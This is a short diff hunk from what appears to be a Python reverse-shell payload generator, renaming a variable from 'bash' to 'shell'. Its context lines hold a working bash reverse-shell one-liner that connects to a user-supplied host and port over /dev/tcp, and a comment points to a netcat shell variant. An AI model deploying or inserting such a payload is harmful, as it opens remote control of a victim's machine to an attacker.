@@ -40,7 +40,7 @@ RPORT = input("Enter port: ")
 
 # Bash shell
 if choice == "1":
-    bash = f'''
+    shell = f'''
 bash -i >& /dev/tcp/{RHOSTS}/{RPORT} 0>&1'''
 
 # Netcat shell
